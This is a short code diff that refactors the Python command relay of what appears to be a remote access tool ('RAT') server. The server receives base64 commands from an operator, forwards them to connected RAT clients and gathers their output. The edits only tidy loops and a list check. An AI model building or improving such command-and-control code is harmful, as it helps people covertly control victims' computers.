@@ -50,9 +50,7 @@ if __name__ == "__main__":
                 clientinfo = fullconn[0]
                 print(f"{Fore.YELLOW}\n[i] Waiting for command from {clientinfo}...{Fore.RESET}")
                 chunks = conn.recv(HEADER).decode()
-                recvout = ""
-                for i in range(int(chunks)):
-                    recvout += conn.recv(HEADER).decode()
+                recvout = "".join(conn.recv(HEADER).decode() for _ in range(int(chunks)))
                 command = base64.b64decode(recvout).decode()
                 print(f"{Fore.YELLOW}[i] Recieved command from {clientinfo}: {Fore.RESET}{command}")
                 outputlist = []
@@ -73,14 +71,12 @@ if __name__ == "__main__":
                             ratconn = ratclient[1]
                             send(base64.b64encode(command.encode(errors="ignore")), ratconn)
                             chunks = ratconn.recv(HEADER).decode()
-                            chunksout = ""
-                            for i in range(int(chunks)):
-                                chunksout += ratconn.recv(HEADER).decode()
+                            chunksout = "".join(ratconn.recv(HEADER).decode() for _ in range(int(chunks)))
                             outputlist.append(chunksout)
                         except ConnectionResetError:
                             ratclients.remove(ratclient)
 
-                    if len(outputlist) < 1:
+                    if not outputlist:
                         outputlist.append(base64.b64encode(
                             f"{Fore.RED}[SERVER] [!] No clients are online or the command had an error{Fore.RESET}".encode(
                                 errors="ignore")))
